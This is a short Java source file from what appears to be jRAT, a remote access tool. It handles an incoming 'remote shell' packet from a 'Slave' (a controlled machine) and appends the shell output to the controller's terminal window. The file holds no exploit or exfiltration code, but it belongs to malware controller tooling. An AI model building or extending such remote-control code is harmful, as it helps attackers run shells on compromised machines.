package io.jrat.controller.packets.incoming;

import io.jrat.controller.Slave;
import io.jrat.controller.ui.frames.FrameRemoteShell;

import java.io.DataInputStream;


public class Packet21RemoteShell extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String command = slave.readLine();
		
		FrameRemoteShell frame = FrameRemoteShell.INSTANCES.get(slave);
		
		if (frame != null) {
			frame.getTerminal().append(command + "\n");
		}

	}

}
